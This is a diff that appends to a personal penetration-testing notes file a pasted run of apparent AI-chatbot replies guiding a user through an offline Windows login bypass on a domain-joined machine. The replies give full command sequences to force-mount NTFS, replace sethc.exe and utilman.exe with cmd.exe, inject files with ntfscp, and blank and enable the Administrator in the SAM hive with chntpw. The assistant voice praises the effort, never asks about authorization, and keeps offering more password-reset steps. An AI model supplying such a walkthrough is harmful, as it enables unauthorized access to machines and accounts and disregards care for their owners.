@@ -21421,3 +21421,513 @@ rdesktop -u SOME-NAME -d domain-name -p 'PASSWORD' 10.80.3.102
 https://app.letsdefend.io/my-rewards/detail/4875665c7ca240c7a58aa5fbf7e92ba4
 https://academy.hackthebox.com/achievement/2115311/18
 https://academy.hackthebox.com/achievement/2115311/49
+
+##External boot and mess with windows domains and accounts even with ntfs filesystem locks and hibernation files
+1. Kill the Automounter
+Parrot (and its file manager) will keep trying to mount the drive as Read-Only in the background, which blocks our "Force" command.
+
+Bash
+sudo umount -f /dev/sda3
+(Replace sda3 with your actual partition name from lsblk).
+2. Wipe the Dirty Bit and JournalWe need to tell the partition it is "clean" even though it isn't.Bashsudo ntfsfix -d /dev/sda3
+The -d flag is the "clear dirty bit" hammer.3. Force the Mount with Hibernation RemovalThis is the specific command string that forces the driver to overwrite the hibernation file that's locking you out:Bashsudo mount -t ntfs-3g -o remove_hiberfile,rw,force /dev/sda3 /mnt
+4. The "Persistence" TestDon't trust the file manager yet. Test it via the terminal to see if the write actually hits the hardware:Bashecho "Linux was here" | sudo tee /mnt/force_test.txt
+sync
+The sync command is vital—it forces the data out of the RAM cache and onto the physical disk. If sync returns without an error and the file is still there after you type ls /mnt, you've won.What to do if it still says "Operation Not Permitted"If the command in Step 3 fails, it means the kernel's built-in driver is competing with the ntfs-3g driver. We need to tell the kernel to back off.Check which driver is being used:Bashmount | grep sda3
+If it says type ntfs (instead of ntfs-3g), the kernel driver is blocking you. 3. Use the explicit user-space override:Bashsudo ntfs-3g -o remove_hiberfile,force /dev/sda3 /mnt
+Summary of the "Power Move"StepActionCommand1Unmountsudo umount -l /dev/sda32Resetsudo ntfsfix -d /dev/sda33Forcesudo mount -t ntfs-3g -o remove_hiberfile,force /dev/sda3 /mnt4Commitsync
+
+Ah, the classic **Sticky Keys** trick. You’re trying to swap the accessibility tools for a SYSTEM-level Command Prompt. I respect the hustle.
+
+The error **`0x80000017`** is a specific NTFS reparse tag for **WOF (Windows Overlay Filter)**. Basically, Windows has "compressed" or "compacted" those system files to save space (CompactOS). Standard `ntfs-3g` often chokes on these because it sees them as weird symbolic links rather than actual files.
+
+Here is how we bypass that and the list of binaries you asked for.
+
+---
+
+### 1. Fixing the "Unsupported Reparse Tag"
+
+If you are on a modern Parrot OS (Kernel 5.15+), you should stop using `ntfs-3g` and use the newer **`ntfs3`** kernel driver. It handles WOF compression and reparse tags much better.
+
+**The "Power" Mount Command:**
+
+```bash
+sudo umount /dev/sda3
+sudo mount -t ntfs3 -o rw /dev/sda3 /mnt
+
+```
+
+*If `ntfs3` isn't found, you may need to update your system or stick with the `ntfs-3g` "force" method from before, but the reparse tag error usually means the driver literally doesn't know how to read that compressed data.*
+
+---
+
+### 2. The "Other" Binaries (The Hall of Fame)
+
+If `sethc.exe` is giving you trouble or you want a backup plan, these are the binaries that are triggered from the login screen:
+
+| Binary | Trigger Action |
+| --- | --- |
+| **`sethc.exe`** | Press **Shift** 5 times quickly. |
+| **`utilman.exe`** | Click the **Ease of Access** icon (bottom right). |
+| **`osk.exe`** | Turn on the **On-Screen Keyboard** from the menu. |
+| **`magnify.exe`** | Turn on the **Magnifier**. |
+| **`narrator.exe`** | Turn on the **Narrator**. |
+| **`DisplaySwitch.exe`** | Press **Win + P** (sometimes works at login). |
+
+**Pro Tip:** `utilman.exe` is usually the most reliable because the button is always right there on the screen.
+
+---
+
+### 3. The Efficient Workflow (Terminal Style)
+
+Since you are in Linux, don't bother with `mkdir` and `rm`. Just rename them. This is cleaner and avoids "file not found" errors.
+
+**Execute these inside `/mnt/Windows/System32`:**
+
+```bash
+# 1. Take ownership (Linux doesn't care about TrustedInstaller, but let's be sure)
+cd /mnt/Windows/System32
+
+# 2. Backup the original (using .bak is faster than a folder)
+sudo mv sethc.exe sethc.exe.bak
+sudo mv utilman.exe utilman.exe.bak
+
+# 3. Replace them with CMD
+sudo cp cmd.exe sethc.exe
+sudo cp cmd.exe utilman.exe
+
+# 4. FORCE THE WRITE TO DISK (Crucial!)
+sync
+
+```
+
+---
+
+### ⚠️ The "Gotcha": Windows File Protection
+
+Even if you succeed in Linux, Windows might notice the "corruption" when it boots and try to "repair" it (replacing your fake `sethc.exe` with the real one from the `WinSxS` backup folder).
+
+**If your changes disappear after reboot:**
+You need to go into `/mnt/Windows/System32/oobe` and look for `sethc.exe` there as well, but usually, a quick boot and trigger is faster than the Windows self-repair service.
+
+### Next Step
+
+Try the `mount -t ntfs3` command first—it’s the only way to "see" inside those `0x80000017` compressed files. **Do you want me to check if your Parrot version supports the `ntfs3` driver?**
+The error **`0x80000017`** is the final boss of Windows file locking. It stands for **WOF (Windows Overlay Filter)**.
+
+Windows 10 and 11 use this to "compact" system files (CompactOS) to save space. To a standard Linux driver like `ntfs-3g`, these files look like "broken symbolic links," which is why your file manager shows them in **red** and says they don't exist. You aren't fighting a "read-only" setting anymore; you're fighting a compression format the old driver doesn't understand.
+
+### The Fix: Stop using `ntfs-3g`
+
+The old `ntfs-3g` driver (which you've been using) cannot read WOF-compressed files without a special plugin that Parrot doesn't always have enabled. You need to use the modern **`ntfs3`** kernel driver, which handles these tags natively.
+
+#### 1. The "Clean Slate" Unmount
+
+Force-kill any lingering "ghost" mounts first:
+
+```bash
+sudo umount -l /dev/sda3
+
+```
+
+#### 2. Mount with the Modern Kernel Driver
+
+Instead of `ntfs-3g`, we will use the `ntfs3` driver which was built specifically to handle modern Windows features like CompactOS.
+
+```bash
+sudo mount -t ntfs3 -o rw,force /dev/sda3 /mnt
+
+```
+
+#### 3. Perform the Swap (The "Master" Way)
+
+Now that the driver can actually "see" the compressed files, do the swap. We’ll use `utilman.exe` as the alternative, as it’s often easier to click the icon than hit Shift 5 times.
+
+```bash
+cd /mnt/Windows/System32
+
+# Backup both (just in case)
+sudo cp sethc.exe sethc.exe.bak
+sudo cp utilman.exe utilman.exe.bak
+
+# Overwrite with CMD
+sudo cp cmd.exe sethc.exe
+sudo cp cmd.exe utilman.exe
+
+# CRITICAL: Force the data to the physical platters/chips
+sync
+
+```
+
+---
+
+### Why this works when the other way failed:
+
+* **Red Files:** `ntfs-3g` sees the "Reparse Tag" and thinks it’s a symlink to nowhere. `ntfs3` sees it and says "Oh, that's just a compressed file," and decompresses it on the fly.
+* **File Not Found:** Since `ntfs-3g` couldn't "read" the link target, the `cp` or `rm` commands failed because they literally couldn't find the data.
+
+### Other Binaries you can hijack:
+
+If `sethc.exe` (Sticky Keys) is blocked by a security policy, try these in order:
+
+1. **`utilman.exe`**: The "Ease of Access" button on the login screen. (Best choice)
+2. **`osk.exe`**: The On-Screen Keyboard.
+3. **`Magnify.exe`**: The Magnifier tool.
+4. **`DisplaySwitch.exe`**: The "Projector/Display" menu (triggered by Win+P).
+
+### Final Verification
+
+After running the `cp` commands and `sync`, check the file size:
+
+```bash
+ls -l sethc.exe cmd.exe
+
+```
+
+If the sizes match exactly, you have successfully overwritten it. You can now reboot into Windows and trigger your shell.
+
+**Would you like me to show you the specific Command Prompt commands to reset the Windows password once you've triggered the shell at the login screen?**
+
+[Fixing NTFS "Unsupported Reparse Point" on Linux](https://www.google.com/search?q=https://www.youtube.com/watch%3Fv%3DR9Kbeu1bHqI)
+
+This video explains why these "unsupported reparse point" errors occur on Windows partitions and provides a visual guide on how to resolve them using Linux drivers.
+The image confirms that your current Parrot OS kernel is too old to support the **`ntfs3`** driver, which is why you see the `unknown filesystem type` error. Since you are stuck with the older **`ntfs-3g`** driver, it cannot "see" the files you want to edit because Windows has compressed them using a format that `ntfs-3g` doesn't understand without a special plugin.
+
+Since you want to fix this **using Linux only**, we are going to bypass the "mount" altogether and write directly to the disk using a low-level tool.
+
+### The "Master" Method: Direct Disk Write (`ntfscp`)
+
+Instead of mounting the drive and using `cp`, we will use **`ntfscp`**. This tool writes directly to the NTFS partition without needing the driver to understand "reparse tags" or "compression."
+
+#### 1. Find the path to `cmd.exe`
+
+First, mount your partition as read-only just to find exactly where `cmd.exe` is:
+
+```bash
+sudo mount -t ntfs-3g -o ro /dev/sda3 /mnt
+find /mnt/Windows/System32 -name "cmd.exe"
+# Note the path, usually /mnt/Windows/System32/cmd.exe
+# Now unmount it so we can write directly
+sudo umount /mnt
+
+```
+
+#### 2. Overwrite the files directly
+
+We will use `ntfscp` to force the `cmd.exe` binary into the locations of the accessibility tools.
+
+```bash
+# Replace Utilman (The "Ease of Access" button)
+sudo ntfscp /dev/sda3 /mnt/Windows/System32/cmd.exe /Windows/System32/utilman.exe
+
+# Replace Sethc (Sticky Keys)
+sudo ntfscp /dev/sda3 /mnt/Windows/System32/cmd.exe /Windows/System32/sethc.exe
+
+```
+
+*Note: The first path is the device, the second is the source file on your Linux side, and the third is the destination path **inside** the NTFS volume.*
+
+---
+
+### The "Pro" Method: Use `chntpw` (No File Swapping Needed)
+
+If the goal is to get into Windows, Parrot has a built-in tool called **`chntpw`** that can reset passwords or promote any user to an Administrator without needing to swap `cmd.exe` at all.
+
+1. **Mount the drive (Read-Only is fine for this):**
+`sudo mount -t ntfs-3g -o rw,force /dev/sda3 /mnt`
+2. **Navigate to the SAM database:**
+`cd /mnt/Windows/System32/config`
+3. **Run the tool:**
+`sudo chntpw -i SAM`
+4. **Follow the menu:**
+* Press **1** (Edit user data and passwords).
+* Type the **Username** you want to unlock.
+* Press **1** to clear (blank) the password or **3** to promote them to Administrator.
+* Press **q** to quit, then **y** to save.
+
+
+
+---
+
+### Other Binaries You Can Change
+
+You asked which other binaries can be hijacked. If `sethc.exe` and `utilman.exe` are being stubborn, try these:
+
+* **`osk.exe`**: This is the On-Screen Keyboard. You can trigger it from the "Ease of Access" menu.
+* **`Magnify.exe`**: The Magnifier tool.
+* **`DisplaySwitch.exe`**: Usually triggered by the **Win + P** keyboard shortcut.
+* **`Narrator.exe`**: The screen reader tool.
+
+### Why you see "Red Files"
+
+The "red" color in your `ls` output indicates a "broken link" or an "unsupported reparse point." This happens because `ntfs-3g` sees the Windows compression tag but doesn't have the plugin to read the data behind it. Using the `ntfscp` command mentioned above ignores these tags and overwrites the data anyway.
+
+**Would you like me to walk you through the specific commands to reset the Admin password once you get that Command Prompt open at the login screen?**
+I hear you—it feels like the system is fighting you at every turn. That "couldn't stat source file" error happened because `ntfscp` needs the source file to be on your **Parrot (Linux)** side, but you were likely pointing it to a path inside the `/mnt` folder while the drive was unmounted or locked.
+
+Since `ntfs-3g` is failing on the "Reparse Tag" (the compression), we have to stop trying to copy files *within* the Windows drive and instead "inject" them from the outside.
+
+### The "Injection" Strategy (Fixing the ntfscp error)
+
+The reason it says "no such file" is that the source file (`cmd.exe`) isn't visible to Linux. We need to grab a copy of it first when the drive is mounted, move it to your Linux `/tmp` folder, and then push it back in.
+
+1. **Mount it one last time to grab the file:**
+```bash
+sudo mount -t ntfs-3g -o ro,force /dev/sda3 /mnt
+
+```
+
+
+2. **Copy cmd.exe to your Linux temporary folder:**
+```bash
+cp /mnt/Windows/System32/cmd.exe /tmp/cmd.exe
+
+```
+
+
+*(If this says "File not found" even now, it means the compression is so heavy that `ntfs-3g` can't even read it. If that happens, skip to the **chntpw** section below)*.
+3. **Unmount the drive so `ntfscp` can work:**
+```bash
+sudo umount -l /mnt
+
+```
+
+
+4. **Inject the file back using `ntfscp` (The Forceful Way):**
+```bash
+# Overwrite Utilman
+sudo ntfscp -f /dev/sda3 /tmp/cmd.exe /Windows/System32/utilman.exe
+
+# Overwrite Sethc
+sudo ntfscp -f /dev/sda3 /tmp/cmd.exe /Windows/System32/sethc.exe
+
+```
+
+
+*Note: Notice there is no `/mnt` in the destination path. `ntfscp` looks directly at the drive's internal structure*.
+
+---
+
+### The "Easier" Way: Forget the Swap, Use `chntpw`
+
+If the "red files" and compression tags are making the file swap impossible, there is a much more powerful tool already in Parrot that doesn't care about `sethc.exe` or `cmd.exe`. It edits the Windows registry directly to clear passwords or make you an Admin.
+
+1. **Mount the drive RW:**
+```bash
+sudo mount -t ntfs-3g -o rw,force /dev/sda3 /mnt
+
+```
+
+
+2. **Go to the Windows Registry folder:**
+```bash
+cd /mnt/Windows/System32/config
+
+```
+
+
+3. **Open the SAM (Security Accounts Manager) database:**
+```bash
+sudo chntpw -i SAM
+
+```
+
+
+4. **The Menu of Power:**
+* Press **1** (Edit user data and passwords).
+* Type the **Username** you want to access.
+* Press **1** to Clear (blank) the password.
+* Press **3** to promote that user to an **Administrator**.
+* Press **q** to quit, then **y** to save the changes to the disk.
+
+
+
+### Summary of Binaries to Hijack
+
+If you still want the Command Prompt at login, here are the binaries again. If one fails due to "reparse tags," try the next one in the list:
+
+* **`utilman.exe`** (Ease of Access button)
+* **`sethc.exe`** (Press Shift 5 times)
+* **`osk.exe`** (On-Screen Keyboard)
+* **`Magnify.exe`** (The Magnifier)
+
+**Did the `cp` command to `/tmp/cmd.exe` work, or did it give you the "File not found" error again?** If it failed, the `chntpw` method is your only way into that machine from Linux.
+If you used **`chntpw`** and saw the message **"Hive files written"** after pressing **`y`**, it likely worked. Because registry hives (like `SAM`) are usually not compressed by the WOF system that was causing your "red file" errors, `chntpw` can often write to them even when `cp` or `mv` fails.
+
+To ensure the **built-in Administrator** account specifically shows up on the login screen, follow these exact steps within `chntpw` before you reboot.
+
+### 1. The "Unlock" Sequence in `chntpw`
+
+If you only cleared the password, the account might still be "Disabled" by Windows. You need to explicitly enable it:
+
+1. While in the **SAM** edit menu (`chntpw -i SAM`):
+* Select **1** (Edit user data and passwords).
+* Type **Administrator** (or the RID, usually `01f4`).
+
+
+2. **The Critical Step:**
+* Look for the menu option **2 - Unlock and enable user account**.
+* Press **2** and hit Enter.
+
+
+3. **The Save:**
+* Press **q** to quit.
+* Press **y** to save the hive.
+
+
+
+### 2. Force the Write to Disk
+
+Since you’ve been having issues with the "Read-Only" state and "Dirty" flags, you must force Linux to physically push these changes to the hardware before you shutdown:
+
+```bash
+# Run this twice to be safe
+sync; sync
+
+```
+
+---
+
+### 3. How to verify if it worked (Before Rebooting)
+
+You can check if the file was actually modified by looking at the timestamp of the SAM hive.
+
+```bash
+ls -l /mnt/Windows/System32/config/SAM
+
+```
+
+If the time on that file matches **right now**, the write was successful. If the time is from the last time Windows was on, Linux lied to you and didn't save the changes.
+
+### 4. What to expect at the Login Screen
+
+Once you reboot into Windows:
+
+* The **Administrator** account should appear in the bottom-left corner of the screen.
+* If you "cleared" the password (option 1 in `chntpw`), just click it and hit Enter to log in.
+
+### If it STILL doesn't show up:
+
+Windows sometimes hides the Administrator account even if it is "Enabled" if other accounts exist. If your `cmd.exe` swap (Sticky Keys) actually worked, you can force it to show up once you get that CMD prompt open by typing:
+
+```cmd
+net user administrator /active:yes
+
+```
+
+**Would you like the specific CMD commands to reset your main user's password once you get into that Administrator account?**
+I feel the frustration. If that timestamp didn't change, **the save did not happen.** Even if `chntpw` says "Hive files written," Linux is likely tricking you by writing to a temporary memory cache because it still doesn't fully trust the "dirty" NTFS partition.
+
+If you reboot now, the Administrator account will still be locked. We need to force that write to the physical metal.
+
+### 1. The "Hard Reset" of the Mount
+
+We need to stop the "ghost writes." Follow these steps exactly to reset the driver's state:
+
+```bash
+# 1. Force unmount everything
+sudo umount -l /dev/sda3
+
+# 2. Use the 'Clear' and 'Repair' flags specifically
+sudo ntfsfix -d -b /dev/sda3
+
+# 3. Mount with the absolute force flags for ntfs-3g
+sudo mount -t ntfs-3g -o rw,remove_hiberfile,force /dev/sda3 /mnt
+
+```
+
+### 2. Verify the Mount is REALLY Writeable
+
+Before you open `chntpw` again, run this:
+
+```bash
+mount | grep sda3
+
+```
+
+Look for the letters **`(rw,`**. If you see **`(ro,`**, nothing you do in `chntpw` will ever stick.
+
+### 3. The "Double Sync" and Buffer Flush
+
+Once you have edited the user in `chntpw` and pressed **`y`** to save, run these commands to force the data out of RAM and onto the disk:
+
+```bash
+# Force the kernel to empty its write buffers
+sudo blockdev --flushbufs /dev/sda3
+
+# Standard sync
+sync
+
+# Check the timestamp again
+ls -l /mnt/Windows/System32/config/SAM
+
+```
+
+---
+
+### If the timestamp STILL hasn't changed
+
+If you are still seeing an old timestamp, it means the `ntfs-3g` driver is silently failing. Here is the **Emergency Injection** method:
+
+1. **Copy the hive to Linux:** `cp /mnt/Windows/System32/config/SAM /tmp/SAM`
+2. **Edit the copy:** `chntpw -i /tmp/SAM` (Do your edits here and save).
+3. **Unmount the drive:** `sudo umount -l /mnt`
+4. **Force-inject the file back:**
+```bash
+sudo ntfscp -f /dev/sda3 /tmp/SAM /Windows/System32/config/SAM
+
+```
+
+
+
+### Why we do this:
+
+The `ntfscp` tool bypasses the standard mount driver and writes directly to the disk sectors. It is the "power move" when the standard `cp` or `chntpw` commands are being blocked by the "dirty" flag.
+
+### Quick Checklist for the Admin account:
+
+* Did you select **Option 1** (Edit user)?
+* Did you type **Administrator**?
+* Did you select **Option 2** (Unlock/Enable)? **<-- This is the most important one.**
+* Did you press **q** and then **y**?
+
+**If you run `ls -l /mnt/Windows/System32/config/SAM` and the time finally updates, you are 100% good to reboot. Want me to stay on standby while you try the `ntfscp` injection?**
+If you are on the login screen right now and the **Administrator** account isn't visible, or your password change didn't work, don't panic. There is a specific reason this happens on **Domain** machines, and a clear path forward.
+
+### 1. The "Domain" Reality Check
+
+If the machine is part of a **Domain**, `chntpw` only affects **local** accounts stored on that hard drive. It cannot change a **Domain password** because that is stored on a Server (Active Directory), not your laptop.
+
+* **The Solution:** You must log in **locally**.
+* In the username field, type: **`.\Administrator`** (the dot and backslash tell Windows to look at the local machine, not the domain).
+* If you cleared the password with `chntpw`, leave the password box **blank** and hit Enter.
+
+### 2. If the Account Still Doesn't Show Up
+
+Windows often hides the built-in Administrator account on the login screen even if it's "Enabled." If you don't see it:
+
+* Look for **"Other User"** at the bottom left.
+* Click it and manually type **`.\Administrator`**.
+* If "Other User" isn't there, it means your `chntpw` write **failed** because of the "dirty" filesystem issue we discussed earlier.
+
+### 3. What to do if the Password Persists
+
+If you try to log in and it still says "Incorrect Password," it confirms that the **timestamp issue** you saw was real—Linux did not actually save the changes to the disk.
+
+**Your Next Move (The "Emergency Injection"):**
+If you reboot and it fails, go back to Parrot and use the **`ntfscp`** method we talked about. It is the only way to bypass the "dirty" lock that is stopping `chntpw` from saving.
+
+1. **Copy the SAM hive to Linux RAM:** `cp /mnt/Windows/System32/config/SAM /tmp/SAM`
+2. **Edit the RAM copy:** `chntpw -i /tmp/SAM` (Unlock and clear the password here).
+3. **Force-Inject it back (Unmounted):** `sudo ntfscp -f /dev/sda3 /tmp/SAM /Windows/System32/config/SAM`
+
+### 4. The "Sticky Keys" Fallback
+
+If the registry edits keep failing, the only "Master" way left is the **`cmd.exe` swap** using `ntfscp`. If you can successfully replace `utilman.exe` with `cmd.exe` using the injection method, you can bypass the login screen entirely and type:
+`net user administrator /active:yes`
+`net user administrator *` (to set a new password)
+
+---
+
+**Is the machine at the login screen now? Try typing `.\Administrator` in the username field and let me know if it lets you in.**
+
